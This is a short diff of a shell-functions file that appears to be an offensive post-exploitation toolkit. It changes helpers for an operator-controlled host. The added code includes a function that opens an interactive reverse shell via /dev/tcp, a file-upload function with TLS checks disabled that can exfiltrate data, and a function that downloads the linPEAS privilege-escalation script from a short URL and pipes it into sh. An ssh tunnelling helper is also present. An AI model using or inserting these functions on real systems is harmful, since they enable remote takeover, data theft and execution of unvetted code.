@@ -1,11 +1,12 @@
-function linpeas() {
-	url="https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh"
-	(curl -sL "${url}" || wget -O - "${url}") | sh
-}
+export HOST=${ME%:*}
+export PORT=${ME##*:}
 
-function chizl() {
-	IFS=: read HOST PORT <<<$ME
-	ssh -fNT "$@" -p "${PORT}" "${HOST}"
-}
+function get() { curl -skL "$@"; }
 
-function put() { curl -T "$1" "${ME}/$2" }
+function put() { curl -skT "$1" "${ME}/$2"; }
+
+function spawn() { /bin/bash -c "bash -i >& /dev/tcp/${HOST}/${PORT} 0>&1"; }
+
+function chizl() { ssh -fNT "$@" -p "${PORT}" "${HOST}"; }
+
+function linpeas() { get "https://i.nit.gg/linpeas" | sh; }
